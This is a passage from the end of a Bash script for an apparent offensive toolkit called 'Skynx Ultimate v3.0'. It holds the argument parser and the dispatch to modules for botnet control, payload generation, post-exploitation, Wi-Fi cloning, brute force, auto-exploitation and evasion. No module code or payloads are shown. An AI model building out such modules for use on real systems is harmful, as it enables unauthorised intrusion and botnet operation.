            MODE="wordlist"
            TARGET_IP="$2"
            shift $(( $# >= 2 ? 2 : $# ))
            ;;
        --wifi-clone)
            MODE="wifi_clone"
            TARGET_IP="$2"
            ACTION="$3"
            shift $(( $# >= 3 ? 3 : $# ))
            ;;
        --wifi-handshake)
            MODE="wifi_handshake"
            TARGET_IP="$2"
            ACTION="$3"
            shift $(( $# >= 3 ? 3 : $# ))
            ;;
        --ninja)
            MODE="stealth"
            TARGET_IP="$2"
            shift $(( $# >= 2 ? 2 : $# ))
            ;;
        --auto-exploit)
            MODE="autoexploit"
            TARGET_IP="$2"
            shift $(( $# >= 2 ? 2 : $# ))
            ;;
        --botnet)
            MODE="botnet"
            ACTION="$2"
            shift $(( $# >= 2 ? 2 : $# ))
            ;;
        --turbo)
            MODE="turbo"
            TARGET_IP="$2"
            shift $(( $# >= 2 ? 2 : $# ))
            ;;
        --optimize-all)
            fn_optimize_all
            exit 0
            ;;
        --clean-memory)
            fn_cleanup_memory
            exit 0
            ;;
        --ultra-scan)
            MODE="ultra_scan"
            TARGET_IP="$2"
            ACTION="$3"
            shift $(( $# >= 3 ? 3 : $# ))
            ;;
        --hashcat)
            MODE="hashcat"
            TARGET_IP="$2"
            ACTION="$3"
            LPORT="$4"
            shift $(( $# >= 4 ? 4 : $# ))
            ;;
        --ssl-cert)
            MODE="ssl_cert"
            TARGET_IP="$2"
            shift $(( $# >= 2 ? 2 : $# ))
            ;;
        --masscan)
            MODE="masscan"
            TARGET_IP="$2"
            ACTION="$3"
            LPORT="$4"
            shift $(( $# >= 4 ? 4 : $# ))
            ;;
        --subdomain)
            MODE="subdomain"
            TARGET_IP="$2"
            ACTION="$3"
            shift $(( $# >= 3 ? 3 : $# ))
            ;;
        --matrix)
            fn_mode_matrix
            exit 0
            ;;
        --skynet)
            fn_module_skynet_mode
            exit 0
            ;;
        --hackerman)
            fn_module_hacker_man
            exit 0
            ;;
        --kitten)
            fn_module_terminal_kitten
            exit 0
            ;;
        --jackpot)
            fn_module_cracker_jack
            exit 0
            ;;
        --morpheus)
            fn_module_morpheus
            exit 0
            ;;
        --ascii)
            MODE="ascii"
            FILE_TARGET="$2"
            shift $(( $# >= 2 ? 2 : $# ))
            ;;
        --rickroll)
            fn_module_rick_roll
            exit 0
            ;;
        --hackersong)
            fn_module_hacker_song
            exit 0
            ;;
        --stats)
            fn_stats
            exit 0
            ;;
        --menu)
            fn_menu_interactive
            exit 0
            ;;
        --check-deps)
            fn_check_deps
            exit 0
            ;;
        -v|--version)
            echo -e "${CYAN}Skynx Ultimate v3.0${NC}"
            echo -e "${DARK}\"$(fn_skynx_phrase)\"${NC}"
            exit 0
            ;;
        -h|--help)
            fn_show_help
            exit 0
            ;;
        *)
            if [[ -n "${SKYNX_DYNAMIC_FLAGS[$1]}" ]]; then
                MODE="dynamic_plugin"
                ACTION="${SKYNX_DYNAMIC_FLAGS[$1]}"
                TARGET_IP="$2"
                shift $(( $# >= 2 ? 2 : $# ))
            else
                echo -e "${RED}[ERROR]${NC} Argumento: $1"
                echo -e "${YELLOW}[AYUDA]${NC} sudo Skynx -h"
                exit 1
            fi
            ;;
    esac
done

# ═══════════════════════════════════════════════════════════════════════════
#                    DISPARADORES FINALES
# ═══════════════════════════════════════════════════════════════════════════

fn_init_logs
fn_init_config
fn_init_plugins

case $MODE in
    recon)
        fn_module_recon
        ;;
    arp)
        fn_module_arp
        ;;
    scan)
        fn_module_audit "$TARGET_IP"
        ;;
    evasion)
        fn_module_evasion "$TARGET_IP"
        ;;
    bruteforce)
        fn_module_bruteforce "$TARGET_IP" "$USER_LIST" "$PASS_LIST" "$ACTION" "$LPORT"
        ;;
    payloads)
        fn_module_payloads_improved "$LHOST" "$LPORT" "$OS_TYPE"
        ;;
    postexploit)
        fn_module_postexploit_improved "$TARGET_IP" "$ACTION"
        ;;
    msf)
        fn_module_msf_console
        ;;
    osint)
        fn_module_osint "$TARGET_IP"
        ;;
    malware)
        fn_module_malware "$FILE_TARGET"
        ;;
    forensic)
        fn_module_forensic "$TARGET_IP"
        ;;
    fullaudit)
        fn_module_fullaudit "$TARGET_IP"
        ;;
    report)
        fn_module_report_improved "$REPORT_TYPE"
        ;;
    ai_auto)
        fn_module_ai_auto "$FILE_TARGET"
        ;;
    encrypt)
        fn_module_encrypt_advanced "$FILE_TARGET"
        ;;
    wordlist)
        fn_module_wordlist_advanced "$TARGET_IP"
        ;;
    wifi_clone)
        fn_module_wifi_clone_real "$TARGET_IP" "$ACTION"
        ;;
    wifi_handshake)
        fn_module_wifi_handshake "$TARGET_IP" "$ACTION"
        ;;
    stealth)
        fn_module_stealth "$TARGET_IP"
        ;;
    autoexploit)
        fn_module_autoexploit "$TARGET_IP"
        ;;
    botnet)
        fn_module_botnet "$ACTION"
        ;;
    turbo)
        fn_module_turbo "$TARGET_IP"
        ;;
    ultra_scan)
        fn_scan_ultra_fast "$TARGET_IP" "$ACTION"
        ;;
    hashcat)
        fn_module_hashcat_brute "$TARGET_IP" "$ACTION" "$LPORT"
        ;;
    ssl_cert)
        fn_module_ssl_cert_gen "$TARGET_IP"
        ;;
    masscan)
        fn_module_masscan_advanced "$TARGET_IP" "$ACTION" "$LPORT"
        ;;
    subdomain)
        fn_module_subdomain_scan "$TARGET_IP" "$ACTION"
        ;;
    ascii)
        fn_module_ascii_art "$FILE_TARGET"
        ;;
    dynamic_plugin)
        if [[ -n "$ACTION" ]] && type "$ACTION" &>/dev/null; then
            $ACTION "$TARGET_IP"
        else
            echo -e "${RED}[ERROR]${NC} Plugin no encontrado: $ACTION"
            exit 1
        fi
        ;;
    *)
        if [[ -z "$MODE" ]]; then
            echo -e "${RED}[ERROR]${NC} Sin modo especificado"
            echo -e "${YELLOW}[AYUDA]${NC} sudo Skynx -h"
            exit 1
        fi
        ;;
esac

fn_log_info "Ejecución completada: $MODE"
echo ""
echo -e "${DARK}  ════════════════════════════════════════════════════════════${NC}"
echo -e "${DARK}  Skynx Ultimate v3.0 - \"$(fn_skynx_phrase)\"${NC}"
echo -e "${DARK}  ════════════════════════════════════════════════════════════${NC}"

exit 0
